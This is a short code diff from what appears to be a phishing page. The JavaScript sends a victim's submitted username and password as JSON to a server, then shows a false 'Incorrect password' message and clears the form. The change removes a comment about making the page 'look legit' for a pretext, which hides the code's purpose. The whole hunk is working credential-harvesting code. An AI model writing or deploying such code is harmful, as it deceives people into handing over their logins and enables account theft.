@@ -26,7 +26,6 @@ document.getElementById('f').addEventListener('submit', async e => {
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ user: fd.get('user'), pass: fd.get('pass') })
   });
-  // redirect to look legit — swap this for whatever fits your pretext
   document.getElementById('msg').textContent = 'Incorrect password. Try again.';
   e.target.reset();
 });
